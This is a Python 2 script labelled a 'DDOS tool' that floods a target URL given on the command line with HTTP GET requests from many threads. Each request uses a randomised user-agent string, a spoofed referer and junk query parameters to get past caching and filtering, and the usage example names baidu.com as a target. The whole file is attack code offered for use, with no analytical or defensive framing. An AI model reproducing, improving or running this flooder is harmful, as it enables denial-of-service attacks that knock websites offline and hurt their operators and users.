#!/usr/bin/python

# Function: DDOS tool
# Author: firefoxbug

import os
import re
import sys
import time
import signal
import socket
import getopt
import random
import urllib2
import threading

def usage():
    """
    Print usage information and exit.
    """
    print ('Usage: python attack.py [-t] [-c] http://www.baidu.com/\n    -h: Help\n    -t: DDOS lasting time\n    -c: Number of threads to create')
    sys.exit()

def user_agent_list():
    """
    Generate a list of user agents.
    """
    user_agents = []
    user_agents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    user_agents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    user_agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    user_agents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    user_agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    user_agents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    user_agents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    user_agents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    user_agents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    user_agents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    user_agents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    return(user_agents)

def referer_list():
    """
    Generate a list of referers.
    """
    referers = []
    referers.append('http://www.usatoday.com/search/results?q=')
    referers.append('http://engadget.search.aol.com/search?q=')
    referers.append('http://' + host + '/')
    return referers

def handler(signum, _):
    """
    Signal handler to exit when time is up.
    """
    if signum == signal.SIGALRM:
        print ("Time is up!")
        print ("Attack finished!")
    sys.exit()

def build_block(size):
    """
    Generate a random ASCII string.
    """
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return out_str

def send_packet(host, param_joiner):
    """
    Send a HTTP request to the target host.
    """
    user_agent = random.choice(user_agent_list())
    referer = random.choice(referer_list())
    headers = {'User-Agent': user_agent, 'Referer': referer}
    params = param_joiner + build_block(random.randint(3, 10)) + '=' + build_block(random.randint(3, 10))
    request = urllib2.Request(url + params, None, headers)
    response = urllib2.urlopen(request)
    page = response.read()

def attack(duration, threads):
    """
    Main DDOS attack function.
    """
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(duration)
    for i in range(threads):
        t = threading.Thread(target=send_packet, args=(host, param_joiner))
        t.start()

if __name__ == '__main__':
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'ht:c:')
    except getopt.GetoptError:
        usage()
    if not opts:
        usage()
    for opt, arg in opts:
        if opt == '-h':
            usage()
        elif opt == '-t':
            duration = int(arg)
        elif opt == '-c':
            threads = int(arg)
    if 'duration' not in locals() or 'threads' not in locals():
        usage()
    url = args[0]
    if not re.match(r'^https?:/{2}\w.+$', url):
        usage()
    host = url.split('/')[2]
    param_joiner = '?'
    if '?' in url:
        param_joiner = '&'
    attack(duration, threads)
